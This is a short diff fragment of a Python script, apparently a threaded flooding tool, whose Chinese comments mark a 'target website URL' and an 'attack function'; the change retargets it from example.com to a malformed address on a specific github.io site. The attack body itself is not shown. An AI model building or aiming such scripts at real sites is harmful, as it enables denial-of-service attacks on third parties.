@@ -2,7 +2,7 @@ import requests
 import threading
 
 # 目標網站的URL
-target_url = "http://example.com"
+target_url = "https.piggaga.github.io/1"
 
 # 定義攻擊函數
 def attack():
